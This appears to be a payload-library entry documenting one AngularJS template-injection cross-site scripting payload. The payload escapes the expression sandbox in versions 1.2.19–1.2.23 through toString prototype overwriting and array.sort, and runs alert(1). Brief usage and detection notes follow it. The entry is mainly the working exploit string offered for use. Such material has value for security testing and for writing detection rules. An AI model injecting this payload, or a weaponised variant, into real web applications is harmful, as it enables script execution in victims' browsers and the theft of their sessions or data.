---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - sort-bypass
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-ToString-Proto-Sort-Alert

## Code

```javascript
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

## Description

Pollutes toString.prototype and uses array.sort to invoke constructor with alert(1) in AngularJS 1.2.19-1.2.23.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Leverages sort callback. | N/A |

## Usage

In array-bound templates.

## Detection

- Sort calls with constructor args.
- toString overwrites.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
